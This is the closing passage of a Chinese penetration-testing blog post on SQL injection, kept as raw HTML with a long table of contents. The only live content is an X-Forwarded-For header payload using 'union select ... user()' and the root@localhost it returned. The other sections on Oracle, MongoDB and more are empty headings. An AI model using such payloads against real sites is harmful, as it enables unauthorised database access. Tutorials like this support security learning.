+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: -127.0.0.1&#x27;union select 1,2,3,user()#</span><br></pre></td></tr></table></figure>
+<p>输入提交包 后看到页面返回 root@loclhost</p>
+<p>搜索框注入</p>
+<h3 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a>Between注入</h3><h3 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h3><h3 id="Order-by注入"><a href="#Order-by注入" class="headerlink" title="Order by注入"></a>Order by注入</h3><h3 id="JSON注入"><a href="#JSON注入" class="headerlink" title="JSON注入"></a>JSON注入</h3><h3 id="DNSlog对外注入"><a href="#DNSlog对外注入" class="headerlink" title="DNSlog对外注入"></a>DNSlog对外注入</h3><h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><h3 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h3><h3 id="MsSQL注入-SQL-SERVER"><a href="#MsSQL注入-SQL-SERVER" class="headerlink" title="MsSQL注入 SQL SERVER"></a>MsSQL注入 SQL SERVER</h3><h3 id="Postgre-sql注入"><a href="#Postgre-sql注入" class="headerlink" title="Postgre sql注入"></a>Postgre sql注入</h3><h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://hungslab.github.io">hungs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hungslab.github.io/posts/bd44.html">https://hungslab.github.io/posts/bd44.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/10/21/MIrJAoiUqnx6zpw.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://lib.baomitu.com/social-share.js/1.0.16/css/share.min.css" media="print" onload="this.media='all'"><script src="https://lib.baomitu.com/social-share.js/1.0.16/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/9d74.html" title="渗透术语介绍"><img class="cover" src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/cover/cover_1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">渗透术语介绍</div></div></a></div><div class="next-post pull-right"><a href="/posts/ef82.html" title="SQL注入总结"><img class="cover" src="https://s2.loli.net/2023/10/21/MIrJAoiUqnx6zpw.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">SQL注入总结</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/09/26/EJys7PtcMRQ4gT1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">hungs</div><div class="author-info__description">Talk is cheap. Show me the code.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/hunngslab"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/hungslab" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:hongbozhao72@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1092134168&amp;site=qq&amp;menu=yes" rel="external nofollow noreferrer" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">SQL注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">理解SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">SQL注入的产生过程及常见原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">数据库基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.4.</span> <span class="toc-text">基本原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.0.2.</span> <span class="toc-text">SQL 注入分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.3.</span> <span class="toc-text">常规利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8%E5%B8%B8%E8%A7%84%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.4.</span> <span class="toc-text">手注常规思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.0.5.</span> <span class="toc-text">详细注入过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.0.5.0.1.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E5%88%97%E6%95%B0"><span class="toc-number">1.0.5.0.2.</span> <span class="toc-text">猜列数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.0.5.0.3.</span> <span class="toc-text">猜数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.5.0.4.</span> <span class="toc-text">猜表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E5%88%97%E5%90%8D"><span class="toc-number">1.0.5.0.5.</span> <span class="toc-text">猜列名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE"><span class="toc-number">1.0.5.0.6.</span> <span class="toc-text">猜用户数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8C%9C-root-%E7%94%A8%E6%88%B7"><span class="toc-number">1.0.5.0.7.</span> <span class="toc-text">猜 root 用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%93%E5%B1%95limit"><span class="toc-number">1.0.5.0.8.</span> <span class="toc-text">拓展limit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.0.5.0.9.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#union-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.5.0.10.</span> <span class="toc-text">union 联合注入原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.6.</span> <span class="toc-text">UNION联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.6.0.1.</span> <span class="toc-text">判断 SQL 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.0.6.0.2.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.6.0.3.</span> <span class="toc-text">联合查询注入获取敏感信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E9%80%9A%E8%BF%87-information-schema-%E8%8E%B7%E5%8F%96%E8%A1%A8"><span class="toc-number">1.0.6.0.4.</span> <span class="toc-text">联合查询注入通过 information_schema 获取表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E9%80%9A%E8%BF%87-information-schema-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="toc-number">1.0.6.0.5.</span> <span class="toc-text">联合查询注入通过 information_schema 获取字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%A1%A8%E9%87%8C%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">1.0.6.0.6.</span> <span class="toc-text">通过联合查询表里的内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.7.</span> <span class="toc-text">布尔型盲注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.7.0.1.</span> <span class="toc-text">判断盲注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.7.0.2.</span> <span class="toc-text">布尔型注入攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.7.0.3.</span> <span class="toc-text">布尔型盲注入获取数据库敏感信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E9%BB%91%E7%9B%92%E6%A8%A1%E5%BC%8F%E4%B8%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.7.0.4.</span> <span class="toc-text">在黑盒模式下布尔型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2%E9%95%BF%E5%BA%A6"><span class="toc-number">1.0.7.0.5.</span> <span class="toc-text">布尔型盲注入查询长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#burpsuite%E7%88%86%E7%A0%B4%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.7.0.6.</span> <span class="toc-text">burpsuite爆破库名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E5%BA%93%E5%90%8D%E6%8E%A5%E7%9D%80%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.7.0.7.</span> <span class="toc-text">得到库名接着获取表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.0.7.0.8.</span> <span class="toc-text">获取字段名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.0.7.0.9.</span> <span class="toc-text">获取数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.8.</span> <span class="toc-text">报错型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%88%86%E6%9E%90"><span class="toc-number">1.0.8.0.1.</span> <span class="toc-text">代码中分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.8.0.2.</span> <span class="toc-text">SQL 报错注入攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.8.0.3.</span> <span class="toc-text">报错注入获取数据库敏感信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.0.8.0.4.</span> <span class="toc-text">其他函数介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E9%BB%91%E7%9B%92%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.8.0.5.</span> <span class="toc-text">在黑盒模式下的报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%BE%97%E5%88%B0%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.8.0.6.</span> <span class="toc-text">报错注入得到库名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96-mysql-%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">1.0.8.0.7.</span> <span class="toc-text">报错注入获取 mysql 账号和密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.8.0.8.</span> <span class="toc-text">报错注入获取表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="toc-number">1.0.8.0.9.</span> <span class="toc-text">报错注入获取字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.8.0.10.</span> <span class="toc-text">报错注入获取信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.9.</span> <span class="toc-text">时间延时型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%84%8F%E6%80%9D"><span class="toc-number">1.0.9.0.1.</span> <span class="toc-text">具体意思</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.0.9.0.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sqlmap%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.9.0.3.</span> <span class="toc-text">sqlmap利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.0.9.0.3.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.9.0.3.2.</span> <span class="toc-text">检测注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.9.0.3.3.</span> <span class="toc-text">列出库名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.9.0.3.4.</span> <span class="toc-text">列出表名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%AD%97%E6%AE%B5"><span class="toc-number">1.0.9.0.3.5.</span> <span class="toc-text">列出字段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="toc-number">1.0.9.0.3.6.</span> <span class="toc-text">列出数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.10.</span> <span class="toc-text">堆叠查询型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.0.10.0.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.10.0.2.</span> <span class="toc-text">是否存在注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.10.0.3.</span> <span class="toc-text">获取库名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.10.0.4.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="toc-number">1.0.10.0.5.</span> <span class="toc-text">获取字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%99%AE%E9%80%9A%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.0.10.0.6.</span> <span class="toc-text">插入普通账号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%92%E5%85%A5mysql%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.0.10.0.7.</span> <span class="toc-text">插入mysql管理员账号</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.11.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.11.0.1.</span> <span class="toc-text">二次注入原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">1.0.11.0.2.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">1.0.11.0.3.</span> <span class="toc-text">二次注入测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.12.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%A0%E4%B8%AAurl%E8%BD%AC%E7%A0%81"><span class="toc-number">1.0.12.0.1.</span> <span class="toc-text">常见几个url转码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E5%87%BD%E6%95%B0addslashes-gpc"><span class="toc-number">1.0.12.0.2.</span> <span class="toc-text">php函数addslashes()   gpc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.12.0.3.</span> <span class="toc-text">宽字节手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.12.0.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.0.12.0.3.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.0.12.0.4.</span> <span class="toc-text">源代码分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E5%AE%BD%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.12.0.5.</span> <span class="toc-text">黑盒环境下的宽字节攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COOKIE%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.13.</span> <span class="toc-text">COOKIE注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="toc-number">1.0.13.0.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.13.0.2.</span> <span class="toc-text">注入攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base64-%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.14.</span> <span class="toc-text">Base64 编码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%88%86%E6%9E%90-base64-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.14.0.1.</span> <span class="toc-text">代码中分析 base64 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%AF%B9-base64-%E7%BC%96%E7%A0%81%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.14.0.2.</span> <span class="toc-text">黑盒环境下对 base64 编码进行注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXF-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.15.</span> <span class="toc-text">XXF 注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#xff-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.0.15.0.1.</span> <span class="toc-text">xff 注入代码分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E9%BB%91%E7%9B%92%E7%8E%AF%E5%A2%83%E4%B8%8B-xff-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.15.0.2.</span> <span class="toc-text">在黑盒环境下 xff 注入攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Between%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.16.</span> <span class="toc-text">Between注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Limit%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.17.</span> <span class="toc-text">Limit注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Order-by%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.18.</span> <span class="toc-text">Order by注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.19.</span> <span class="toc-text">JSON注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E5%AF%B9%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.20.</span> <span class="toc-text">DNSlog对外注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.21.</span> <span class="toc-text">加解密注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.22.</span> <span class="toc-text">中转注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.23.</span> <span class="toc-text">Access注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MsSQL%E6%B3%A8%E5%85%A5-SQL-SERVER"><span class="toc-number">1.0.24.</span> <span class="toc-text">MsSQL注入 SQL SERVER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Postgre-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.25.</span> <span class="toc-text">Postgre sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.26.</span> <span class="toc-text">Oracle注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MongoDB%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.27.</span> <span class="toc-text">MongoDB注入</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="No title">No title</a><time datetime="2023-11-23T11:32:55.255Z" title="Created 2023-11-23 19:32:55">2023-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="No title">No title</a><time datetime="2023-11-23T08:06:29.406Z" title="Created 2023-11-23 16:06:29">2023-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="No title">No title</a><time datetime="2023-11-22T03:43:38.931Z" title="Created 2023-11-22 11:43:38">2023-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="No title">No title</a><time 